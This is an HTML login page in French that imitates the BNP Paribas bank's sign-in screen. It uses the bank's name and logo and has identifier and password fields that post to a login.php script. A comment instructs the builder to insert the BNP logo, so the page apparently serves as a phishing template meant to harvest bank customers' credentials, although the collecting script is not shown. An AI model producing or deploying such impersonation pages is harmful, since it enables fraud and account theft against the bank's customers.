<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNP Paribas - Connexion</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <!-- Ici tu mets ton logo BNP Paribas -->
            <img src="bnp-logo.png" alt="BNP Paribas">
        </div>
        <h2>Accédez à votre compte</h2>
        <form action="login.php" method="POST">
            <div class="input-group">
                <label>Identifiant</label>
                <input type="text" name="email" placeholder="Votre identifiant" required>
            </div>
            <div class="input-group">
                <label>Mot de passe</label>
                <input type="password" name="password" placeholder="Votre mot de passe" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
        <p class="help"><a href="#">Mot de passe oublié ?</a></p>
    </div>
</body>
</html>
